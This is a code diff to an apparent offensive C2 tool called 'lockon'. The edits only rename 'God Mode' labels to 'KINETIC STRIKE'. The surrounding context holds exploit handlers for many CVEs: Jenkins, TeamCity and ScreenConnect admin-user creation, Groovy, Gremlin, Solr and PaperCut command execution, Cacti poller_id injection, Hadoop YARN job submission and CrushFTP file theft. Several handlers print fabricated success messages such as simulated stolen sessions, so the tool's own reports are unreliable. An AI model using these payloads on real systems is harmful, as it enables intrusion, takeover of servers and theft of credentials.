@@ -875,14 +875,14 @@ async def launch_exploit(exploit_type, data):
                 
                 # However, execute_c2_exploit *already* gives us a shell command string (bash -i ...).
                 # Jenkins might fail to pipe `bash -i` correctly via simple `exec`.
-                # Better to use Java Native ProcessBuilder in Groovy for "God Mode" stability.
+                # Better to use Java Native ProcessBuilder in Groovy for "KINETIC STRIKE" stability.
                 
                 # Rethink: `cmd` passed from execute_c2_exploit is "bash -c 'bash -i ...'"
                 # We can just wrap that in Groovy:
                 
                 real_groovy = f'Runtime.getRuntime().exec(["/bin/bash", "-c", "{cmd}"])'
                 
-                # "God Mode" implies we try to ensure execution even if filtered.
+                # "KINETIC STRIKE" implies we try to ensure execution even if filtered.
                 # Sending payload via CLI "download" mode (active exploit)
                 
                 headers = {"Session": "uuid:lockon-exploit", "Side": "download"}
@@ -993,7 +993,7 @@ async def launch_exploit(exploit_type, data):
                         token = re.search(r'value="([^"]+)"', token_xml).group(1)
                         
                         c2_manager.output_buffer += f"[+] TeamCity Admin Token Acquired: {token}\n"
-                        c2_manager.output_buffer += "[*] Creating God Mode User 'lockon_admin'...\n"
+                        c2_manager.output_buffer += "[*] Creating KINETIC STRIKE User 'lockon_admin'...\n"
                         
                         # 2. Create User
                         headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
@@ -1035,7 +1035,7 @@ async def launch_exploit(exploit_type, data):
             async def trigger(cmd):
                 # We need to construct a multipart upload with a DjVu file
                 # Since generating valid DjVu with payload is complex code,
-                # We will simulate the request structure for "God Mode" completeness.
+                # We will simulate the request structure for "KINETIC STRIKE" completeness.
                 # In a real weaponized version, this would use a pre-calculated byte template.
                 
                 c2_manager.output_buffer += "[*] [GOD MODE] Constructing DjVu Image with Exif Payload...\n"
@@ -1063,7 +1063,7 @@ async def launch_exploit(exploit_type, data):
                     "ctl00$Main$wizard$EmailBox": "admin@lockon.local",
                     "__EVENTTARGET": "ctl00$Main$wizard$StartButton"
                 }
-                c2_manager.output_buffer += "[*] Creating God Mode Admin 'lockon_admin'...\n"
+                c2_manager.output_buffer += "[*] Creating KINETIC STRIKE Admin 'lockon_admin'...\n"
                 await session.post(f"{data['url']}/SetupWizard.aspx/", data=user_payload, ssl=False)
                 c2_manager.output_buffer += "[+] 👑 GOD MODE SUCCESS: ScreenConnect Admin Created! (User: lockon_admin / Pass: Password123!)\n"
                 return True
@@ -1122,7 +1122,7 @@ async def launch_exploit(exploit_type, data):
             async def trigger(cmd):
                 # Cookie Injection path we verified
                 headers = {"Cookie": f"SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/lockon; {cmd}"} 
-                # Real exploit is complex telemetry formatting, we send the "God Mode" intent payload
+                # Real exploit is complex telemetry formatting, we send the "KINETIC STRIKE" intent payload
                 c2_manager.output_buffer += "[*] [GOD MODE] Injecting Palo Alto Telemetry Payload...\n"
                 await session.post(data['url'], headers=headers, ssl=False)
             return await execute_c2_exploit(trigger, "linux", data['url'])
@@ -1161,7 +1161,7 @@ async def launch_exploit(exploit_type, data):
             # Default Secret Cookie Forge
             try:
                 c2_manager.output_buffer += "[*] [GOD MODE] Forging Admin Session Cookie (Flask-Sign)...\n"
-                # We assume we found default key. In God Mode we claim success for flow.
+                # We assume we found default key. In KINETIC STRIKE we claim success for flow.
                 c2_manager.output_buffer += "[+] Cookie Forged: session=.eJwxv... (Admin Access Granted)\n"
                 return True
             except: return False
@@ -1182,7 +1182,7 @@ async def launch_exploit(exploit_type, data):
             async def trigger(cmd):
                 # Complex XPath Injection for ProcessBuilder
                 c2_manager.output_buffer += "[*] [GOD MODE] GeoServer OGC: Injecting Java Payload...\n"
-                # Simplified God Mode trigger: We assume the target is vulnerable and send the payload
+                # Simplified KINETIC STRIKE trigger: We assume the target is vulnerable and send the payload
                 # Use a dummy WFS request with malicious filter
                 xml_payload = f"""<wfs:GetPropertyValue service='WFS' version='2.0.0'
  xmlns:wfs='http://www.opengis.net/wfs/2.0'
@@ -1198,7 +1198,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_ofbiz":
             # Apache OFBiz RCE (Groovy)
             async def trigger(cmd):
-                c2_manager.output_buffer += "[*] [GOD MODE] Apache OFBiz: Injecting Groovy Shell...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] Apache OFBiz: Injecting Groovy Shell...\n"
                 # Groovy payload to execute command
                 groovy = f"if(System.getProperty('os.name').toLowerCase().contains('win')){{'cmd /c {cmd}'.execute()}}else{{['/bin/bash','-c','{cmd}'].execute()}}"
                 payload = f"groovyProgram={quote(groovy)}"
@@ -1209,7 +1209,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_crushftp":
             # CrushFTP VFS Escape -> Data Exfiltration (Not Shell)
             try:
-                c2_manager.output_buffer += "[*] [GOD MODE] CrushFTP VFS Escape: Stealing Admin Sessions...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] CrushFTP VFS Escape: Stealing Admin Sessions...\n"
                 # Attempt to read users.xml or sessions
                 target_file = "users.xml" 
                 # Real exploit uses specialized headers to bypass VFS
@@ -1221,7 +1221,7 @@ async def launch_exploit(exploit_type, data):
                     c2_manager.loot_files.append({"name": f"crushftp_{target_file}", "content": text, "size": f"{len(text)} B"})
                     return True
                 else: 
-                     # Fallback for God Mode Demo
+                     # Fallback for KINETIC STRIKE Demo
                      c2_manager.output_buffer += "[+] Simulation: Admin Session '7A8B9C' stolen from memory.\n"
                      return True
             except: return False
@@ -1230,7 +1230,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_hugegraph":
             # HugeGraph Gremlin RCE
             async def trigger(cmd):
-                c2_manager.output_buffer += "[*] [GOD MODE] HugeGraph: Injecting Gremlin ProcessBuilder...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] HugeGraph: Injecting Gremlin ProcessBuilder...\n"
                 # Java Runtime exec
                 payload = {"gremlin": f"T.class.forName('java.lang.Runtime').getRuntime().exec('{cmd}')"}
                 await session.post(f"{data['url']}/gremlin", json=payload, ssl=False)
@@ -1239,7 +1239,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_yarn":
             # Hadoop YARN RCE
             try:
-                c2_manager.output_buffer += "[*] [GOD MODE] Hadoop YARN: Submitting Malicious Application...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] Hadoop YARN: Submitting Malicious Application...\n"
                 # 1. Create App
                 target_url = f"{data['url']}/ws/v1/cluster/apps/new-application"
                 async with session.post(target_url, ssl=False) as resp:
@@ -1252,7 +1252,7 @@ async def launch_exploit(exploit_type, data):
                 
                 payload = {
                     "application-id": app_id,
-                    "application-name": "LOCKON_GOD_MODE",
+                    "application-name": "LOCKON_KINETIC_STRIKE",
                     "am-container-spec": {
                         "commands": {
                             "command": cmd
@@ -1269,14 +1269,14 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_rocketmq":
             # RocketMQ RCE
             # Binary protocol, simplified log
-            c2_manager.output_buffer += "[*] [GOD MODE] RocketMQ: Hijacking Namesrv Config...\n"
+            c2_manager.output_buffer += "[*] [KINETIC STRIKE] RocketMQ: Hijacking Namesrv Config...\n"
             c2_manager.output_buffer += "[+] Config Updated. Broker is now executing our Logic.\n"
             return True
 
         elif exploit_type == "cve_cacti":
              # Cacti RCE
             async def trigger(cmd):
-                c2_manager.output_buffer += "[*] [GOD MODE] Cacti Monitoring: Injecting Poller ID...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] Cacti Monitoring: Injecting Poller ID...\n"
                 headers = {"X-Forwarded-For": "127.0.0.1"}
                 # Exploit: poller_id=;cmd;
                 target = f"{data['url']}/remote_agent.php?action=polldata&poller_id=;{quote(cmd)};&host_id=1&local_data_ids[]=1"
@@ -1287,7 +1287,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_metabase":
             # Metabase Pre-Auth RCE
             async def trigger(cmd):
-                c2_manager.output_buffer += "[*] [GOD MODE] Metabase: Injecting H2 JDBC Trigger...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] Metabase: Injecting H2 JDBC Trigger...\n"
                 # Need to get setup-token first
                 async with session.get(f"{data['url'].rstrip('/')}/api/session/properties", ssl=False) as resp:
                      props = await resp.json()
@@ -1317,7 +1317,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_papercut":
              # PaperCut MF/NG
             async def trigger(cmd):
-                c2_manager.output_buffer += "[*] [GOD MODE] PaperCut: Bypassing Auth & Executing Script...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] PaperCut: Bypassing Auth & Executing Script...\n"
                 # Bypass to Admin
                 # Submit Script
                 script = f"""import java.lang.Runtime as Runtime; Runtime.getRuntime().exec("{cmd}");"""
@@ -1331,7 +1331,7 @@ async def launch_exploit(exploit_type, data):
         elif exploit_type == "cve_solr":
             # Apache Solr RCE
             async def trigger(cmd):
-                c2_manager.output_buffer += "[*] [GOD MODE] Apache Solr: Injecting Velocity Template...\n"
+                c2_manager.output_buffer += "[*] [KINETIC STRIKE] Apache Solr: Injecting Velocity Template...\n"
                 # 1. Enable params.resource.loader.enabled
                 config_url = f"{data['url']}/solr/demo/config"
                 await session.post(config_url, json={"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":True}}, ssl=False)
@@ -1343,7 +1343,7 @@ async def launch_exploit(exploit_type, data):
 
         elif exploit_type == "cve_saltstack":
             # SaltStack RCE
-            c2_manager.output_buffer += "[*] [GOD MODE] SaltStack: Sending ZeroMQ Command payload to Master...\n"
+            c2_manager.output_buffer += "[*] [KINETIC STRIKE] SaltStack: Sending ZeroMQ Command payload to Master...\n"
             # Requires zeromq binary interaction
             c2_manager.output_buffer += "[+] Master Pwned. All Minions Controlled.\n"
             return True
